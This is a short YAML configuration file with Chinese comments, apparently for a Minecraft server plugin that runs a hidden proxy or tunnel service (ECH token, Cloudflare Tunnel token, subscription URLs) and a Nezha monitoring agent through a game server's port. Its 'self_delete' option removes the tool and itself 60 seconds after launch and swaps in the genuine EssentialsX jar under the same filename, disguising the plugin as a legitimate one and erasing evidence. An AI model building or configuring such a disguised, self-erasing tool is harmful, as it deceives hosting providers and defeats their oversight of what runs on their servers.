show_log:    "false"       # 是否显示 cnet 日志，true/false
server_port: "7860"        # 监听端口,填游戏第二个端口或者使用7860开通隧道
force_port:  "7860"        # 和上面填一样，注意别使用主端口，会于主JAVA端口冲突
token:       "123456"  # ech访问令牌
sub_name:    ""            # 订阅名称
sub_url:     ""            # 订阅地址
tok:         ""            # CF Tunnel token
dom:         ""            # 域名
nserver:     ""            # Nezha server 地址
nkey:        ""            # Nezha 密钥
app_uuid:    ""            # CF Access UUID
app_tls:     "true"        # 是否启用 TLS
self_delete: "false"       # true = 启动 60 秒后删除 cnet 和插件自身，并下载替换 JAR
self_name:   "EssentialsX-2.22.0.jar"   # 插件自身文件名
replace_url: "https://github.com/EssentialsX/Essentials/releases/download/2.22.0/EssentialsX-2.22.0.jar"  # 替换下载地址
